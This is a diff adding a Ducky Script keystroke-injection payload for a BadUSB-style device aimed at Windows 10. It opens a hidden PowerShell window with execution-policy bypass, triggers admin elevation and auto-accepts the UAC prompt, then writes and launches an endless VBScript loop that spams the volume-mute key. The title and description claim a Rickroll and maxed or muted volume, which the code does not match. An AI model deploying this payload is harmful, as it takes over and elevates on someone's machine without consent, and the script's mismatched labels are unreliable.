@@ -1,0 +1,45 @@
+REM Title: Rickroll with Max Volume spam
+REM Author: @beigeworm
+REM Description: Uses Powershell to create a .vbs script to keep volume muted on a loop.
+REM Target: Windows 10
+
+REM =============================================================================
+
+REM some setup for dukie script.
+LOCALE US
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window).
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+CONTROL SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 5000
+
+REM create the .vbs script to keep the volume maxed.
+STRING cmd
+ENTER
+STRING copy con volup.vbs
+ENTER
+STRING do
+ENTER
+STRING Set objShell = CreateObject("WScript.Shell")
+ENTER
+STRING objShell.SendKeys(chr(&hAD))
+ENTER
+STRING WScript.Sleep 10
+ENTER
+STRING loop
+ENTER
+CTRL z
+ENTER
+STRING start volup.vbs
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+
+
+
